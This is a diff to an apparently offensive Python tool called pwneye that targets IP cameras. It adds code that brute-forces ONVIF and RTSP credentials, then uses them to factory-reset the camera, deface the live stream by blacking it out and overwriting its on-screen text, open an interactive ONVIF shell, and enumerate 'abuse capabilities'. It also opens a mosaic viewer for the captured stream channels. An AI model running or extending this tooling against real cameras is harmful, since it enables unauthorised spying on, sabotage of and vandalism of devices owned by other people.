@@ -5,6 +5,7 @@ import subprocess
 import tempfile
 import threading
 import time
+import traceback
 from datetime import datetime
 from pathlib import Path
 
@@ -14,14 +15,29 @@ from pwneye.core.types import ExitCode, PromptInterrupt, Result, RtspAttempt, Rt
 
 from pwneye.core.network import common as netcomm
 from pwneye.core.network import onvif, rtsp
+from pwneye.core import viewer
 
 from pwneye.core.storage import cache as cachedata
+from pwneye.core.storage import deface as defacedata
 from pwneye.core.storage import onvif as onvifdata
 from pwneye.core.storage import rtsp as rtspdata
 from pwneye.config import RECORDINGS_DIR, SNAPSHOTS_DIR
 
 ONVIF_SCOPE_PREFIX = "onvif://www.onvif.org/"
 RTSP_CHANNEL_SELECT_PROMPT = "Select channel (CTRL-C to exit)"
+RTSP_OPEN_ALL_CHANNELS_OPTION = "Open all discovered channels in a dedicated client"
+
+
+def _allow_open_all_channels(args: argparse.Namespace) -> bool:
+    """
+    Return whether the dedicated multi-channel client should be offered.
+    """
+    return (
+        not args.legacy
+        and not args.no_video
+        and args.record is None
+        and args.snapshot is None
+    )
 
 def run(args: argparse.Namespace, tui: TUI) -> ExitCode:
     init = _initialize_environment(args, tui)
@@ -40,11 +56,11 @@ def run(args: argparse.Namespace, tui: TUI) -> ExitCode:
         return ExitCode.USER_ABORT
 
     # ONVIF Testing
-    onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_rebooted = [], None, None, False
+    onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_post_action_completed = [], None, None, False
     if not args.skip_onvif:
         onvif_kb = onvifdata.load_knowledge_base()
         try:
-            onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_rebooted = _run_onvif_scan(
+            onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_post_action_completed = _run_onvif_scan(
                 args,
                 onvif_kb,
                 cache_entry,
@@ -53,14 +69,14 @@ def run(args: argparse.Namespace, tui: TUI) -> ExitCode:
         except PromptInterrupt:
             raise
         except KeyboardInterrupt:
-            if not args.skip_rtsp and not args.reboot:
+            if not args.skip_rtsp and not args.reboot and not args.reset and args.deface is None and not args.undeface and not args.shell:
                 tui.warning("ONVIF scan interrupted. Continuing with RTSP...")
                 onvif_rtsp_streams, manufacturer, onvif_credentials = [], None, None
             else:
                 raise
 
-        if args.reboot:
-            return ExitCode.SUCCESS if onvif_rebooted else ExitCode.FAILURE
+        if args.reboot or args.reset or args.deface is not None or args.undeface or args.shell:
+            return ExitCode.SUCCESS if onvif_post_action_completed else ExitCode.FAILURE
 
     # RTSP Testing
     if not args.skip_rtsp:
@@ -250,8 +266,50 @@ def _initialize_environment(args: argparse.Namespace, tui: TUI) -> Result:
     if args.reboot and args.skip_onvif:
         tui.error("Cannot use --reboot together with --skip-onvif")
         return Result(ok=False, exit_code=ExitCode.FAILURE)
-
-    if bootstrap.is_first_run():
+    if args.reset and args.skip_onvif:
+        tui.error("Cannot use --reset together with --skip-onvif")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.deface is not None and args.skip_onvif:
+        tui.error("Cannot use --deface together with --skip-onvif")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.undeface and args.skip_onvif:
+        tui.error("Cannot use --undeface together with --skip-onvif")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.shell and args.skip_onvif:
+        tui.error("Cannot use --shell together with --skip-onvif")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.reboot and args.reset:
+        tui.error("Cannot use --reboot together with --reset")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.deface is not None and args.reboot:
+        tui.error("Cannot use --deface together with --reboot")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.deface is not None and args.reset:
+        tui.error("Cannot use --deface together with --reset")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.undeface and args.reboot:
+        tui.error("Cannot use --undeface together with --reboot")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.undeface and args.reset:
+        tui.error("Cannot use --undeface together with --reset")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.undeface and args.deface is not None:
+        tui.error("Cannot use --undeface together with --deface")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.shell and args.reboot:
+        tui.error("Cannot use --shell together with --reboot")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.shell and args.reset:
+        tui.error("Cannot use --shell together with --reset")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.shell and args.deface is not None:
+        tui.error("Cannot use --shell together with --deface")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    if args.shell and args.undeface:
+        tui.error("Cannot use --shell together with --undeface")
+        return Result(ok=False, exit_code=ExitCode.FAILURE)
+    first_run = bootstrap.is_first_run()
+    if first_run:
         tui.info("First execution detected, initializing pwneye...")
 
     # Runtime dirs
@@ -266,15 +324,41 @@ def _initialize_environment(args: argparse.Namespace, tui: TUI) -> Result:
     if snapshots_path:
         tui.info2("Snapshots directory initialized ({path})", path=snapshots_path)
 
+    if first_run:
+        required_paths = [
+            bootstrap.PWNEYE_DIR,
+            bootstrap.CACHE_DIR,
+            bootstrap.RECORDINGS_DIR,
+            bootstrap.SNAPSHOTS_DIR,
+        ]
+        if all(path.exists() and path.is_dir() for path in required_paths):
+            tui.success("pwneye was initialized successfully")
+        else:
+            tui.error("pwneye initialization did not complete successfully")
+            return Result(ok=False, exit_code=ExitCode.FAILURE)
+
     # External dependencies
     dependencies = []
-    if not args.discover:
+    onvif_only_action = bool(
+        args.reboot
+        or args.reset
+        or args.deface is not None
+        or args.undeface
+        or args.shell
+    )
+    if not args.discover and not args.skip_rtsp and not onvif_only_action:
         dependencies = ["ffprobe"]
 
-        if args.record is not None or args.snapshot is not None:
+        if (
+            args.record is not None
+            or args.snapshot is not None
+            or (not args.no_video and not args.legacy)
+        ):
             dependencies.append("ffmpeg")
 
-        if args.snapshot is None and (args.record is None or not args.no_video):
+        if (args.record is not None and not args.no_video) or (
+            args.legacy and not args.no_video
+        ):
             dependencies.append("ffplay")
 
     if dependencies:
@@ -584,7 +668,10 @@ def _run_onvif_scan(
         cached_onvif_auth = cachedata.get_cached_onvif_auth(cache_entry)
 
     if cached_onvif_auth:
-        tui.info("Trying cached ONVIF credentials for the target...")
+        tui.info(
+            "Checking whether the target supports ONVIF on port {port}...",
+            port=cached_onvif_auth["port"],
+        )
         camera, credentials, successful_port, responsive_onvif_ports = _attempt_onvif_login(
             args=args,
             ports=[cached_onvif_auth["port"]],
@@ -592,6 +679,7 @@ def _run_onvif_scan(
             passwords=[cached_onvif_auth["password"]],
             tui=tui,
             live_label="Trying cached ONVIF credentials...",
+            auth_label="Trying cached ONVIF credentials for the target...",
         )
 
         if camera is not None:
@@ -675,11 +763,70 @@ def _run_onvif_scan(
         reboot_completed = _reboot_onvif_camera(args, camera, tui)
         return [], None, credentials, reboot_completed
 
+    if args.reset:
+        _persist_onvif_cache_entry(
+            args=args,
+            port=successful_port,
+            credentials=credentials,
+            manufacturer=None,
+            streams=None,
+            tui=tui,
+            announce=not used_cached_onvif_auth,
+        )
+        reset_completed = _reset_onvif_camera(args, camera, tui)
+        return [], None, credentials, reset_completed
+
+    if args.deface is not None:
+        _persist_onvif_cache_entry(
+            args=args,
+            port=successful_port,
+            credentials=credentials,
+            manufacturer=None,
+            streams=None,
+            tui=tui,
+            announce=not used_cached_onvif_auth,
+        )
+        deface_completed = _deface_onvif(args.target, camera, args.deface, tui)
+        return [], None, credentials, deface_completed
+
+    if args.undeface:
+        _persist_onvif_cache_entry(
+            args=args,
+            port=successful_port,
+            credentials=credentials,
+            manufacturer=None,
+            streams=None,
+            tui=tui,
+            announce=not used_cached_onvif_auth,
+        )
+        undeface_completed = _undeface_onvif(args.target, camera, tui)
+        return [], None, credentials, undeface_completed
+
+    if args.shell:
+        _persist_onvif_cache_entry(
+            args=args,
+            port=successful_port,
+            credentials=credentials,
+            manufacturer=None,
+            streams=None,
+            tui=tui,
+            announce=not used_cached_onvif_auth,
+        )
+        shell_completed = _open_onvif_shell(
+            camera,
+            args.target,
+            successful_port,
+            credentials,
+            tui,
+        )
+        return [], None, credentials, shell_completed
+
     # ---------- EXTRACTION PHASE ----------
     manufacturer = _extract_device_info(camera, tui)
     _extract_onvif_users(camera, tui)
     _extract_network_config(camera, tui)
     _extract_media_profiles(camera, tui)
+    _extract_onvif_capabilities(camera, tui)
 
     streams = _extract_rtsp_streams(camera, tui)
 
@@ -710,6 +857,45 @@ def _resolve_onvif_targets(args, kb):
     passwords = _resolve_credential_values(args.onvif_password) if args.onvif_password else kb["passwords"]
 
     return ports, usernames, passwords
+
+
+def _format_onvif_auth_label(
+    base_label: str | None,
+    *,
+    ports: list[int],
+    usernames: list[str],
+    passwords: list[str],
+    threads: int,
+) -> str | None:
+    """
+    Build a concise ONVIF brute-force summary, similar to RTSP.
+    """
+    if base_label is None:
+        return None
+
+    attempts = len(ports) * len(usernames) * len(passwords)
+    thread_count = max(1, min(threads, attempts or 1))
+
+    lowered = base_label.lower()
+    qualifier = ""
+    if "cached" in lowered:
+        qualifier = " using cached credentials"
+    elif "user-provided" in lowered:
+        qualifier = " using user-provided credentials"
+    elif "rtsp credentials" in lowered:
+        qualifier = " using RTSP credentials"
+
+    return (
+        "Trying {attempts} ONVIF combination(s){qualifier} across {ports} port(s), "
+        "{usernames} username(s), {passwords} password(s) and {threads} thread(s)..."
+    ).format(
+        attempts=attempts,
+        qualifier=qualifier,
+        ports=len(ports),
+        usernames=len(usernames),
+        passwords=len(passwords),
+        threads=thread_count,
+    )
 
 def _rtsp_credentials_not_tested_via_onvif(
     args: argparse.Namespace,
@@ -795,6 +981,13 @@ def _attempt_onvif_login(
     """
     auth_label_printed = False
     auth_hint_printed = False
+    auth_label = _format_onvif_auth_label(
+        auth_label,
+        ports=ports,
+        usernames=usernames,
+        passwords=passwords,
+        threads=args.threads,
+    )
 
     def print_auth_label() -> None:
         nonlocal auth_label_printed
@@ -1003,6 +1196,65 @@ def _reboot_onvif_camera(
     )
     return False
 
+
+def _reset_onvif_camera(
+    args: argparse.Namespace,
+    camera: object,
+    tui: TUI,
+) -> bool:
+    """
+    Factory-reset the camera via ONVIF and perform a simple reachability check.
+    """
+    if not tui.confirm(
+        "Do you really want to factory-reset the camera via ONVIF?",
+        default=False,
+    ):
+        tui.warning("ONVIF factory reset aborted at user request")
+        return False
+
+    tui.warning("Requesting ONVIF factory reset...")
+
+    result = {
+        "done": False,
+        "ok": False,
+    }
+
+    def request_reset() -> None:
+        result["ok"] = onvif.system_factory_reset(camera, "Hard")
+        result["done"] = True
+
+    worker = threading.Thread(target=request_reset, daemon=True)
+    worker.start()
+
+    # Give the ONVIF request a brief head start. If it fails immediately,
+    # surface the error before entering the polling loop.
+    worker.join(timeout=1.0)
+    if result["done"] and not result["ok"]:
+        tui.error("The ONVIF factory reset request was rejected or not supported")
+        return False
+
+    tui.info2("ONVIF factory reset request sent")
+    tui.info("Checking if the camera is still reachable...")
+
+    deadline = time.monotonic() + 15
+    while time.monotonic() < deadline:
+        if not netcomm.is_host_reachable(
+            args.target,
+            timeout=1.0,
+            icmp_attempts=1,
+        ):
+            tui.success("The device has been reset!")
+            return True
+
+        time.sleep(2)
+
+    tui.warning(
+        "The ONVIF factory reset request was sent, but the target still appears "
+        "to be reachable. Please verify manually that the reset was completed."
+    )
+    return True
+
+
 def _extract_network_config(camera: object, tui: TUI) -> None:
     """Extract and display network configuration."""
     tui.info("Trying to extract network configuration...")
@@ -1042,6 +1294,339 @@ def _extract_media_profiles(camera: object, tui: TUI) -> None:
             "No media profiles were returned by the target. "
             "The camera may restrict access to this operation"
         )
+
+
+def _extract_onvif_capabilities(camera: object, tui: TUI) -> None:
+    """
+    Extract and display useful post-auth ONVIF capabilities.
+    """
+    tui.info("Enumerating useful ONVIF capabilities...")
+
+    capabilities = onvif.get_abuse_capabilities(camera)
+    if capabilities:
+        tui.info2("ONVIF Capabilities:")
+        tui.block(capabilities)
+    else:
+        tui.warning("Unable to determine additional ONVIF capabilities")
+
+
+def _run_onvif_text_deface(
+    camera: object,
+    message: str,
+    tui: TUI,
+) -> bool:
+    """
+    Apply the ONVIF text replacement workflow and verify the result.
+    """
+    message_label = "an empty string" if message == "" else message
+    tui.info(
+        "Trying to replace the current on-stream text with {text}",
+        text=message_label,
+    )
+    update_results = onvif.deface_osd_entries(camera, message)
+    if not update_results:
+        tui.error("No writable on-screen text layer was found")
+        return False
+
+    attempted_tokens = [
+        entry["token"]
+        for entry in update_results
+        if entry.get("status") == "updated"
+    ]
+
+    rejected_updates = [
+        entry for entry in update_results if entry.get("status") != "updated"
+    ]
+
+    if not attempted_tokens:
+        tui.error("Unable to change the text shown on the stream")
+        return False
+
+    if rejected_updates:
+        tui.warning(
+            "Some text layers could not be updated ({count})",
+            count=len(rejected_updates),
+        )
+
+    tui.info("Verifying the text update...")
+
+    verification_results = onvif.verify_defaced_osd_entries(
+        camera,
+        attempted_tokens,
+        message,
+    )
+    verified = [entry for entry in verification_results if entry.get("status") == "verified"]
+    truncated = [entry for entry in verification_results if entry.get("status") == "truncated"]
+    failed = [entry for entry in verification_results if entry.get("status") == "failed"]
+    unconfirmed = [entry for entry in verification_results if entry.get("status") == "unconfirmed"]
+
+    if not verified and not truncated:
+        if unconfirmed and not failed:
+            tui.warning("The device accepted the update, but ONVIF could not confirm it afterwards")
+        else:
+            tui.error("Unable to confirm the text update")
+        return False
+
+    if truncated:
+        for entry in truncated:
+            tui.warning(
+                "The camera truncated the text. Visible text: [bold]{text}[/bold]",
+                text=entry.get("visible_text") or "(empty)",
+            )
+
+    if failed:
+        tui.warning(
+            "Some updated text layers did not keep the requested message ({count})",
+            count=len(failed),
+        )
+
+    if unconfirmed:
+        tui.warning(
+            "Some updated text layers could not be confirmed afterwards ({count})",
+            count=len(unconfirmed),
+        )
+
+    return True
+
+
+def _save_deface_restore_profile(
+    host: str,
+    camera: object,
+    message: str,
+    tui: TUI,
+) -> dict | None:
+    """
+    Capture and persist a restore profile for a future --undeface operation.
+    """
+    tui.info("A backup profile is being created for future restorations...")
+    profile = onvif.build_deface_restore_profile(camera, message)
+
+    has_text_layers = bool(profile.get("text_layers"))
+    has_imaging = bool((profile.get("imaging") or {}).get("settings"))
+    if not has_text_layers and not has_imaging:
+        tui.error("Unable to create a restore profile for this target")
+        return None
+
+    path = defacedata.save_restore_profile(host, profile)
+    tui.success("Backup profile saved successfully to {path}", path=path)
+    return profile
+
+
+def _deface_onvif(
+    host: str,
+    camera: object,
+    message: str,
+    tui: TUI,
+) -> bool:
+    """
+    Darken the stream and overwrite ONVIF OSD text entries when available.
+    """
+    tui.info("Inspecting ONVIF deface capabilities...")
+    deface_support = onvif.get_deface_support(camera)
+    supports_darkening = bool(deface_support.get("darkening"))
+    supports_text = bool(deface_support.get("text"))
+
+    if not supports_darkening and not supports_text:
+        tui.error("The target does not support ONVIF deface")
+        if deface_support.get("imaging_traceback"):
+            tui.warning("Something went wrong while talking to the target")
+        elif deface_support.get("imaging_error"):
+            tui.warning("{reason}", reason=deface_support["imaging_error"])
+        return False
+
+    if supports_darkening and supports_text:
+        tui.info2("The target supports ONVIF deface")
+        confirm_message = "Do you want to proceed with the deface attempt?"
+    else:
+        tui.warning("Only a partial deface is available on this target")
+        if not supports_darkening:
+            tui.warning("Stream darkening is not available through ONVIF")
+        if not supports_text:
+            tui.warning("No writable on-stream text layer was found")
+        confirm_message = "Do you want to proceed with the partial deface attempt?"
+
+    if not tui.confirm(
+        confirm_message,
+        default=False,
+    ):
+        tui.warning("Deface aborted at user request")
+        return False
+
+    message_label = "an empty string" if message == "" else message
+    tui.warning(
+        "Trying to deface the target stream with {text}",
+        text=message_label,
+    )
+
+    restore_profile = _save_deface_restore_profile(host, camera, message, tui)
+    if restore_profile is None:
+        return False
+
+    darkening_completed = not supports_darkening
+    if supports_darkening:
+        tui.info("Trying to darken the stream...")
+        imaging_result = onvif.apply_imaging_blackout(camera)
+        if not imaging_result.get("ok"):
+            tui.error("Unable to darken the stream through ONVIF")
+            if imaging_result.get("traceback"):
+                tui.warning("Something went wrong while talking to the target")
+            elif imaging_result.get("error"):
+                tui.warning("{reason}", reason=imaging_result["error"])
+            return False
+
+        tui.info("Verifying stream darkening...")
+        if not onvif.verify_imaging_blackout(
+            camera,
+            str(imaging_result.get("token") or ""),
+            imaging_result.get("applied_fields") or {},
+        ):
+            tui.error("Unable to confirm that the stream was darkened")
+            return False
+
+        tui.success("The stream was darkened successfully")
+        darkening_completed = True
+
+    text_completed = not supports_text
+    if supports_text:
+        text_completed = _run_onvif_text_deface(
+            camera,
+            message,
+            tui,
+        )
+
+    if supports_darkening and supports_text:
+        if darkening_completed and text_completed:
+            tui.success("The target stream has been defaced!")
+            tui.info("To restore the previous configuration, run the tool again with --undeface")
+            return True
+        return False
+
+    if darkening_completed or text_completed:
+        tui.success("The target stream has been (partially) defaced!")
+        tui.info("To restore the previous configuration, run the tool again with --undeface")
+        return True
+
+    return False
+
+
+def _undeface_onvif(
+    host: str,
+    camera: object,
+    tui: TUI,
+) -> bool:
+    """
+    Restore the previously saved ONVIF deface profile.
+    """
+    tui.info("Looking for a saved deface profile for this target...")
+    profile = defacedata.load_restore_profile(host)
+    if profile is None:
+        tui.error("No saved deface profile was found for this target")
+        return False
+
+    profile_path = defacedata.get_restore_profile_path(host)
+    tui.info2("A saved deface profile was found at {path}", path=profile_path)
+
+    has_text_layers = bool(profile.get("text_layers"))
+    imaging_profile = profile.get("imaging") or {}
+    has_imaging = bool(imaging_profile.get("settings"))
+
+    if not has_text_layers and not has_imaging:
+        tui.error("The saved deface profile does not contain any restorable configuration")
+        return False
+
+    if not tui.confirm(
+        "Do you want to proceed with the undeface attempt?",
+        default=False,
+    ):
+        tui.warning("Undeface aborted at user request")
+        return False
+
+    tui.warning("Trying to restore the target stream...")
+
+    imaging_restored = not has_imaging
+    if has_imaging:
+        tui.info("Trying to restore the original stream brightness profile...")
+        imaging_restored = onvif.restore_imaging_profile(camera, imaging_profile)
+        if imaging_restored:
+            tui.success("The original stream brightness profile was restored successfully")
+        else:
+            tui.warning("Unable to restore the original stream brightness profile")
+
+    text_restored = not has_text_layers
+    if has_text_layers:
+        tui.info("Trying to restore the original on-stream text...")
+        text_results = onvif.restore_osd_entries(camera, profile.get("text_layers") or [])
+        restored = [entry for entry in text_results if entry.get("status") == "restored"]
+        unconfirmed = [entry for entry in text_results if entry.get("status") == "unconfirmed"]
+        failed = [entry for entry in text_results if entry.get("status") == "failed"]
+
+        text_restored = bool(restored) and not failed and not unconfirmed
+        if text_restored:
+            tui.success("The original on-stream text was restored successfully")
+        elif restored:
+            tui.warning("Some text layers were restored, but others could not be confirmed")
+        else:
+            tui.warning("Unable to restore the original on-stream text")
+
+    if imaging_restored and text_restored:
+        tui.success("The target stream has been restored!")
+        return True
+
+    if imaging_restored or text_restored:
+        tui.warning("The target stream was only partially restored")
+        return True
+
+    tui.error("Unable to restore the target stream")
+    return False
+
+
+def _open_onvif_shell(
+    camera: object,
+    host: str,
+    port: int,
+    credentials: tuple[str, str] | dict | None,
+    tui: TUI,
+) -> bool:
+    """
+    Launch the interactive onvif-python shell using the current authenticated context.
+    """
+    if credentials is None:
+        tui.error("Unable to open the ONVIF shell without valid credentials")
+        return False
+
+    if isinstance(credentials, tuple):
+        username = str(credentials[0] or "") if len(credentials) >= 1 else ""
+        password = str(credentials[1] or "") if len(credentials) >= 2 else ""
+    else:
+        username = str(credentials.get("username") or "")
+        password = str(credentials.get("password") or "")
+
+    if not username:
+        tui.error("Unable to open the ONVIF shell without valid credentials")
+        return False
+
+    tui.info("Opening an interactive ONVIF shell...")
+    try:
+        shell_ok = onvif.open_interactive_shell(
+            camera,
+            host=host,
+            port=port,
+            username=username,
+            password=password,
+        )
+    except KeyboardInterrupt:
+        raise
+    except Exception:
+        tui.error("Unable to open the interactive ONVIF shell")
+        tui.block(traceback.format_exc().splitlines(), indent=0)
+        return False
+
+    if shell_ok:
+        tui.info("The interactive ONVIF shell was closed")
+        return True
+
+    tui.error("The interactive ONVIF shell exited unexpectedly")
+    return False
 
 def _extract_rtsp_streams(camera: object, tui: TUI) -> list[str]:
     """
@@ -1114,7 +1699,7 @@ def _filter_onvif_rtsp_streams_by_valid_port(
 
     return [
         url for url in streams
-        if rtsp.parse_rtsp_url(url)["port"] in valid_ports
+        if (rtsp.parse_rtsp_url(url)["port"] or 554) in valid_ports
     ]
 
 # ----------------------------------------
@@ -1740,6 +2325,7 @@ def _discover_rtsp_channels(
     tui.info("Enumerating RTSP channels using the validated connection template...")
     tui.info("Press CTRL-C to stop channel enumeration and choose from the channels found")
     tui.start_live("Enumerating RTSP channels...")
+    tui.success("RTSP channel {channel} is valid", channel=initial_channel)
 
     next_candidates = {
         "low": 17,
@@ -1799,7 +2385,9 @@ def _maybe_select_rtsp_channel(
     attempt: RtspAttempt,
     args: argparse.Namespace,
     tui: TUI,
-) -> tuple[RtspAttempt, list[RtspChannelEntry] | None]:
+    *,
+    allow_open_all: bool = False,
+) -> tuple[RtspAttempt | None, list[RtspChannelEntry] | None]:
     """
     Optionally enumerate and select a specific RTSP channel from a multi-channel template.
     """
@@ -1825,8 +2413,9 @@ def _maybe_select_rtsp_channel(
             selected = tui.select_channel(
                 cached_entries,
                 prompt=RTSP_CHANNEL_SELECT_PROMPT,
+                extra_option=RTSP_OPEN_ALL_CHANNELS_OPTION if allow_open_all else None,
             )
-            return selected.attempt, cached_entries
+            return None if selected is None else selected.attempt, cached_entries
 
     if not tui.confirm(
         "This RTSP stream may support multiple channels. Try to enumerate them?",
@@ -1850,8 +2439,9 @@ def _maybe_select_rtsp_channel(
     selected = tui.select_channel(
         channels,
         prompt=RTSP_CHANNEL_SELECT_PROMPT,
+        extra_option=RTSP_OPEN_ALL_CHANNELS_OPTION if allow_open_all else None,
     )
-    return selected.attempt, channels
+    return None if selected is None else selected.attempt, channels
 
 def _build_rtsp_attempts(
     host: str,
@@ -1920,6 +2510,7 @@ def _prioritize_onvif_rtsp_attempts(
             remaining.append(attempt)
 
     return prioritized + remaining
+
 
 def _try_cached_rtsp_auth(
     args: argparse.Namespace,
@@ -1991,6 +2582,7 @@ def _try_cached_rtsp_auth(
         args,
         tui,
         onvif_credentials=onvif_credentials,
+        warn_rtsp_instability=False,
     )
     return True
 
@@ -2207,6 +2799,11 @@ def _run_rtsp_scan(
             tui.info("Skipping exhaustive RTSP path scan at user request")
             return False
 
+    if len(attempts) > 5000:
+        tui.warning(
+            "This RTSP scan will generate a large number of requests. Consider specifying at least a username to reduce the number of attempts"
+        )
+
     message = (
         "Trying {attempts} RTSP combination(s) using user-provided connection string(s) across {ports} port(s), {paths} path(s) and {threads} thread(s)..."
         if provided_connection_strings
@@ -2400,12 +2997,6 @@ def _warn_before_rtsp_stream(
         "If the live stream does not load immediately, the device may need a moment to recover"
     )
 
-    if onvif_credentials is not None:
-        tui.warning(
-            "ONVIF access was confirmed earlier in this run. "
-            "If the stream still does not work, you can try rebooting the camera with --reboot"
-        )
-
 def _resolve_media_output_path(
     filename: str | None,
     *,
@@ -2548,6 +3139,35 @@ def _build_ffplay_cmd(attempt: RtspAttempt) -> list[str]:
         "-flags", "low_delay",
         "-i", attempt.url,
     ]
+
+def _launch_ffplay_preview(attempt: RtspAttempt) -> tuple[bool, str | None]:
+    """
+    Launch ffplay in the background and return quickly to the CLI.
+    """
+    stderr_path = Path(
+        tempfile.mkstemp(prefix="pwneye-ffplay-", suffix=".log")[1]
+    )
+    stderr_handle = stderr_path.open("w", encoding="utf-8")
+    try:
+        process = subprocess.Popen(
+            _build_ffplay_cmd(attempt),
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=stderr_handle,
+            start_new_session=True,
+        )
+    finally:
+        stderr_handle.close()
+
+    time.sleep(0.8)
+    exit_code = process.poll()
+    if exit_code is None:
+        stderr_path.unlink(missing_ok=True)
+        return True, None
+
+    detail = _read_process_error(stderr_path)
+    stderr_path.unlink(missing_ok=True)
+    return False, detail or "ffplay exited unexpectedly"
 
 def _terminate_process(proc: subprocess.Popen | None) -> int | None:
     """
@@ -2839,40 +3459,52 @@ def _play_rtsp_stream(
     detach: bool = True,
 ) -> None:
     """
-    Open a valid RTSP stream with ffplay for live preview.
+    Open a valid RTSP stream either in ffplay legacy mode or in the dedicated viewer.
     """
-    cmd = _build_ffplay_cmd(attempt)
+    del detach
 
-    tui.info("Opening live preview with ffplay...")
-
-    try:
-        if detach:
-            player = subprocess.Popen(
-                cmd,
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-                start_new_session=True,
-            )
-
-            time.sleep(1.0)
-            if player.poll() is not None:
-                tui.error("Unable to open the RTSP stream with ffplay")
+    if args.legacy:
+        tui.info("Opening live preview with ffplay...")
+        opened, detail = _launch_ffplay_preview(attempt)
+        if opened:
             return
 
-        subprocess.run(
-            cmd,
-            check=True,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-        )
-    except KeyboardInterrupt:
-        tui.console.file.write("\r\033[2K")
-        tui.console.file.flush()
-    except OSError:
-        tui.error("Unable to open the RTSP stream with ffplay")
-    except subprocess.CalledProcessError:
-        tui.error("Unable to open the RTSP stream with ffplay")
+        if detail:
+            tui.error("Unable to open the RTSP stream with ffplay ({detail})", detail=detail)
+        else:
+            tui.error("Unable to open the RTSP stream with ffplay")
+        return
+
+    tui.info("Opening live preview in the dedicated client...")
+    opened, detail = viewer.open_preview([attempt])
+
+    if opened:
+        return
+
+    if detail:
+        tui.error("Unable to open the live preview ({detail})", detail=detail)
+    else:
+        tui.error("Unable to open the live preview")
+
+def _open_multichannel_viewer(
+    channels: list[RtspChannelEntry],
+    tui: TUI,
+) -> None:
+    """
+    Open all discovered RTSP channels inside a single mosaic viewer window.
+    """
+    attempts = [entry.attempt for entry in channels]
+
+    tui.info("Opening multi-channel live preview...")
+    opened, detail = viewer.open_preview(attempts)
+
+    if opened:
+        return
+
+    if detail:
+        tui.error("Unable to open the multi-channel viewer ({detail})", detail=detail)
+    else:
+        tui.error("Unable to open the multi-channel viewer")
 
 def _run_multichannel_preview_session(
     selected_attempt: RtspAttempt,
@@ -2891,10 +3523,21 @@ def _run_multichannel_preview_session(
     )
 
     while True:
-        current_attempt = tui.select_channel(
+        extra_option = (
+            RTSP_OPEN_ALL_CHANNELS_OPTION
+            if _allow_open_all_channels(args)
+            else None
+        )
+        selected = tui.select_channel(
             channels,
             prompt=RTSP_CHANNEL_SELECT_PROMPT,
-        ).attempt
+            extra_option=extra_option,
+        )
+        if selected is None:
+            _open_multichannel_viewer(channels, tui)
+            return
+
+        current_attempt = selected.attempt
         _play_rtsp_stream(
             current_attempt,
             args,
@@ -3020,16 +3663,31 @@ def _handle_rtsp_stream(
     args: argparse.Namespace,
     tui: TUI,
     onvif_credentials: tuple[str, str] | None = None,
+    warn_rtsp_instability: bool = True,
 ) -> None:
     """
     Handle post-discovery RTSP actions such as preview and recording.
     """
-    _warn_before_rtsp_stream(
+    if warn_rtsp_instability:
+        _warn_before_rtsp_stream(
+            tui,
+            onvif_credentials=onvif_credentials,
+        )
+
+    attempt, discovered_channels = _maybe_select_rtsp_channel(
+        attempt,
+        args,
         tui,
-        onvif_credentials=onvif_credentials,
+        allow_open_all=_allow_open_all_channels(args),
     )
 
-    attempt, discovered_channels = _maybe_select_rtsp_channel(attempt, args, tui)
+    if attempt is None:
+        if discovered_channels and len(discovered_channels) > 1:
+            _open_multichannel_viewer(discovered_channels, tui)
+            return
+
+        tui.error("Unable to open the multi-channel viewer")
+        return
 
     if args.no_video and args.record is None and args.snapshot is None:
         tui.info("Skipping live preview due to --no-video")
